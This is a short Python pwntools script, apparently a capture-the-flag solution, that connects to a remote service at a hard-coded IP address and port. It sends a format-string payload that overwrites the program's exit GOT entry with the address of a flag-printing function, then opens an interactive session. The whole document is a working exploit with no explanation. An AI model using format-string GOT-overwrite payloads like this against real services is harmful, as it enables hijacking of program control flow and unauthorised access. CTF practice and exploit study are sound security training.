from pwn import *

#p=process("./prob2")
p=remote("220.249.52.134",42837)

exit_got=0x601060
flag=0x4008da

p.recv()
p.sendline("2")

pay="%4196570c%8$lnAA"+p64(exit_got)

p.sendline(pay)

p.interactive()
